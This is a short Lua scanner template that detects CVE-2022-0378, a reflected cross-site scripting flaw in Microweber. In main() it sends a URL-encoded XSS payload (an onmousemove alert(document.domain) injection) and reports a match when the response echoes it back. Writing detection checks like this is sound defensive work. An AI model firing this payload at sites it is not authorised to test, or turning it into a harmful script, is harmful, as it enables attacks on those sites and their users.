SCAN_TYPE = 3
BODY_MATCH = {
    "mwui_init",
    'onmousemove="alert(document.domain)',
}

local function send_report(resp)
    Reports:add{
        name = "CVE-2022-0378",
        description = "Microweber contains a reflected cross-site scripting in Packagist microweber/microweber prior to 1.2.11.",
        risk = "medium",
        url = resp.url,
        matches = {
            status_code = "200",
            body = {
                "mwui_init",
                'onmousemove="alert(document.domain)',
            },
            full_response = show_response(resp)
        }
    }
end

local function scan_cve(target_path)
    local new_path = pathjoin(HttpMessage:path(), target_path)
    local new_url = HttpMessage:urljoin(new_path)
    local resp_status, resp = pcall(function()
        return http:send{url = new_url}
    end)
    if resp_status == true then
        local body = resp.body
        local body_match = Matcher:match_body(body, BODY_MATCH) -- Matching body with List with and conditions
        if resp.status ~= 200 then return end
        if body_match then send_report(resp) end
    end
end

function main()
    scan_cve("module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(document.domain)+xx=%22test&from_url=x")
end
